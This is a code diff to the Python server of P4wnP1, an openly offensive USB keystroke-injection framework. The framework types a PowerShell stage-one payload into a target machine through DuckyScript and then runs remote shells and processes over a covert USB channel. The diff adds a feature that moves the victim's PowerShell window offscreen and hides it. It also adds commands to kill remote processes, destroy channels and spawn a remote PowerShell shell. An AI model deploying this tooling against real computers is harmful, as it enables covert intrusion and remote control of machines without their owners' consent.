@@ -8,7 +8,7 @@ from pydispatch import dispatcher
 from LinkLayer  import LinkLayer
 from TransportLayer import TransportLayer
 from threading import Thread, Condition, Event
-from BlockingQueue import BlockingQueue
+#from BlockingQueue import BlockingQueue
 from DuckEncoder import DuckEncoder
 from Config import Config
 from StageHelper import StageHelper
@@ -21,7 +21,7 @@ class P4wnP1(cmd.Cmd):
 	... maybe not, who knows ?!
 	"""
 
-	DEBUG=True
+	DEBUG= False
 
 	# message types from CLIENT (powershell) to server (python)
 	CTRL_MSG_FROM_CLIENT_RESERVED = 0
@@ -29,17 +29,17 @@ class P4wnP1(cmd.Cmd):
 	CTRL_MSG_FROM_CLIENT_RCVD_STAGE2 = 2
 	CTRL_MSG_FROM_CLIENT_STAGE2_RUNNING = 3
 	CTRL_MSG_FROM_CLIENT_RUN_METHOD_RESPONSE = 4 # response from a method ran on client
-	CTRL_MSG_FROM_CLIENT_ADD_CHANNEL = 5
+	#CTRL_MSG_FROM_CLIENT_ADD_CHANNEL = 5
 	CTRL_MSG_FROM_CLIENT_RUN_METHOD = 6 # client tasks server to run a method
 	CTRL_MSG_FROM_CLIENT_DESTROY_RESPONSE = 7
 	CTRL_MSG_FROM_CLIENT_PROCESS_EXITED = 8
 
 	# message types from server (python) to client (powershell)
 	CTRL_MSG_FROM_SERVER_STAGE2_RESPONSE = 1000
-	CTRL_MSG_FROM_SERVER_SEND_OS_INFO = 1001
-	CTRL_MSG_FROM_SERVER_SEND_PS_VERSION = 1002
+	#CTRL_MSG_FROM_SERVER_SEND_OS_INFO = 1001
+	#CTRL_MSG_FROM_SERVER_SEND_PS_VERSION = 1002
 	CTRL_MSG_FROM_SERVER_RUN_METHOD = 1003 # server tasks client to run a method
-	CTRL_MSG_FROM_SERVER_ADD_CHANNEL_RESPONSE = 1004
+	#CTRL_MSG_FROM_SERVER_ADD_CHANNEL_RESPONSE = 1004
 	CTRL_MSG_FROM_SERVER_RUN_METHOD_RESPONSE = 1005 # response from a method ran on server
 	CTRL_MSG_FROM_SERVER_DESTROY = 1006 # response from a method ran on server
 
@@ -50,7 +50,7 @@ class P4wnP1(cmd.Cmd):
 
 		self.client = Client() # object to monitor state of remote client
 
-		self.control_sysinfo_response = BlockingQueue("CONTROL_SERVER_SYSINFO_RESPONSE")
+		#self.control_sysinfo_response = BlockingQueue("CONTROL_SERVER_SYSINFO_RESPONSE")
 
 		self.server_thread_in = Thread(target = self.__input_handler, name = "P4wnP1 Server Input Loop", args = ( ))
 		self.server_thread_out = Thread(target = self.__output_handler, name = "P4wnP1 Server Output Loop", args = ( ))
@@ -117,10 +117,12 @@ Use "help FireStage1" to get more details.
 		while interacting:
 			if not self.client.isConnected():
 				interacting = False
-				print "Client disconnected, stop interacting"
+				print "\nClient disconnected, stop interacting"
 				break
 			if proc.hasExited:
-				print "Process exited... stopping interaction"
+				print "\nProcess exited... stopping interaction"
+				if proc.keepTillInteract:
+					self.client.removeProc(proc.id)
 				break
 
 			try:
@@ -135,14 +137,14 @@ Use "help FireStage1" to get more details.
 				proc.setInteract(False)
 				print "Interaction stopped by keyboard interrupt"
 
-	def addChannel(self, payload):
-		'''
-		Client requested new channel, add it...
-		'''
+	#def addChannel(self, payload):
+		#'''
+		#Client requested new channel, add it...
+		#'''
 		
-		ch_id, ch_type, ch_encoding  = struct.unpack("!IBB", payload)
+		#ch_id, ch_type, ch_encoding  = struct.unpack("!IBB", payload)
 
-		P4wnP1.print_debug("Server add channel request. Channel id '{0}', type {1}, encoding {2}".format(ch_id, ch_type, ch_encoding))
+		#P4wnP1.print_debug("Server add channel request. Channel id '{0}', type {1}, encoding {2}".format(ch_id, ch_type, ch_encoding))
 
 	
 	def onClientProcessExitted(self, payload):
@@ -152,7 +154,8 @@ Use "help FireStage1" to get more details.
 		if proc:
 			proc.hasExited = True
 			print "Proc with id {0} exited".format(proc_id)
-			self.client.removeProc(proc_id)
+			if not proc.keepTillInteract:
+				self.client.removeProc(proc_id)
 	
 	def get_next_method_id(self):
 		next = self._next_client_method_id
@@ -244,8 +247,8 @@ Use "help FireStage1" to get more details.
 						#self.client.setOSInfo(payload)
 					#elif msg_type == P4wnP1.CTRL_MSG_FROM_SERVER_SEND_PS_VERSION:
 						#self.client.setPSVersion(payload)
-					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_ADD_CHANNEL:
-						self.addChannel(payload)
+					#elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_ADD_CHANNEL:
+						#self.addChannel(payload)
 					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_DESTROY_RESPONSE:
 						print "Client received kill request and tries to terminate."
 					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_RUN_METHOD:
@@ -299,7 +302,7 @@ Use "help FireStage1" to get more details.
 	def killCLient(self):
 		self.sendControlMessage(P4wnP1.CTRL_MSG_FROM_SERVER_DESTROY)
 	
-	def stage1_trigger(self, trigger_type=1, trigger_delay_ms=1000):
+	def stage1_trigger(self, trigger_type=1, trigger_delay_ms=1000,  hideTargetWindow = True):
 		'''
 		Triggers Stage 1 either with pure PowerShell using reflections (trigger_type = 1)
 		or with PowerShell invoking a .NET assembly, running stage1 (trigger_type = 2)
@@ -327,6 +330,12 @@ Use "help FireStage1" to get more details.
 		
 		ps_script = ""
 		
+		if hideTargetWindow:
+			# move window offscreen + hide it + post request to owning window
+			ps_script += StageHelper.out_PS_SetWindowPos(x=-100, y=-100, cx=80, cy=80, flags=0x4000+0x80) + "\n"
+			#ps_script += StageHelper.out_PS_SetWindowPos(x=100, y=100, cx=80, cy=80, flags=0x4) + "\n"
+
+		
 		if trigger_type == 1:
 			# read PID and VID
 			pid=""
@@ -339,12 +348,12 @@ Use "help FireStage1" to get more details.
 				vid=f.read()
 				vid=(vid[2:6]).upper()
 				
-			ps_script = "$USB_VID='{0}';$USB_PID='{1}';".format(vid, pid) 
+			ps_script += "$USB_VID='{0}';$USB_PID='{1}';".format(vid, pid) 
 			
 			with open("Stage1.ps1","rb") as f:	
 				ps_script += StageHelper.out_PS_IEX_Invoker(f.read())
 		elif trigger_type == 2:
-			ps_script = StageHelper.out_PS_Stage1_invoker("Stage1.dll")
+			ps_script += StageHelper.out_PS_Stage1_invoker("Stage1.dll")
 					
 		self.duckencoder.outhidDuckyScript(ps_stub) # print DuckyScript stub
 		self.duckencoder.outhidStringDirect(ps_script + ";exit\n") # print stage1 PowerShell script			
@@ -378,9 +387,18 @@ Use "help FireStage1" to get more details.
 		method_args = struct.pack("!B{0}sx{1}sx".format(len(filename), len(args)), use_channels_byte, filename, args) # create null terminated strings from process name and args
 
 		self.client.callMethod("core_create_proc", method_args, self.handler_client_create_proc, waitForResult = waitForResult)
+		
+	def client_call_kill_proc(self, proc_id):
+		method_args = struct.pack("!I", proc_id)
+
+		self.client.callMethod("core_kill_proc", method_args, self.handler_client_kill_proc, waitForResult = False)	
 
 	def client_call_inform_channel_added(self, channel):
 		self.client.callMethod("core_inform_channel_added", struct.pack("!I", channel.id), self.handler_client_inform_channel_added, waitForResult = False)
+		
+	def client_call_destroy_channel(self, channel):
+		self.client.callMethod("core_destroy_channel", struct.pack("!I", channel.id), self.handler_client_destroy_channel, waitForResult = False)	
+		
 	# HANDLER
 	def handler_client_echotest(self, response):
 		print response
@@ -390,6 +408,15 @@ Use "help FireStage1" to get more details.
 		
 	def handler_client_create_shell_proc(self, response):
 		return self.handler_client_create_proc(response)
+	
+	def handler_client_kill_proc(self, response):
+		#pid = struct.unpack("!I", response)[0]
+		#proc =  self.client.getProcess(pid)
+		#if proc:
+			#self.client.removeChannel(proc.ch_stdin.id)
+			#self.client.removeChannel(proc.ch_stderr.id)
+			#self.client.removeChannel(proc.ch_stdout.id)
+		pass		
 		
 	def handler_client_create_proc(self, response):
 		proc_id, uses_channels, ch_stdin, ch_stdout, ch_stderr = struct.unpack("!IBIII", response)
@@ -429,23 +456,36 @@ Use "help FireStage1" to get more details.
 			return proc
 		else:
 			print "Process created without channels, PID: {0}".format(proc_id)
-		
-
-		
-		# retrieve process info
 
 	def handler_client_inform_channel_added(self, response):
 		P4wnP1.print_debug("Channel added inform " + repr(response))
+		
+	def handler_client_destroy_channel(self, response):
+		channel_id =  struct.unpack("!I",  response)[0]
+		self.client.removeChannel(channel_id)
+		
 	
 	###################
 	# interface methods callable from P4wnP1 console
 	#####################
 
 
+	def do_KillProc(self, line):
+		'''
+	Try to kill the given remote process
+	'''
+		try:
+			proc_id = int(line)
+			self.client_call_kill_proc(proc_id)
+		except ValueError:
+			print "{0} is not a process id".format(line)
+		
+
+
 	def do_KillClient(self, line):
 		'''
-		Try to kill the process of the remote client
-		'''
+	Try to kill the remote client
+	'''
 
 		if not self.client.isConnected():
 			print "This doesn't make sense, there's no client connected"
@@ -486,7 +526,10 @@ Use "help FireStage1" to get more details.
 		if not self.client.isConnected():
 			print "Not possible... Run 'FireStage1' first, to get the target connected"
 			return
-		self.client_call_create_shell_proc()
+		if "powershell" in line.lower():
+			self.client_call_create_shell_proc("powershell.exe")
+		else:
+			self.client_call_create_shell_proc()
 
 		
 	#def do_run_method(self, line):
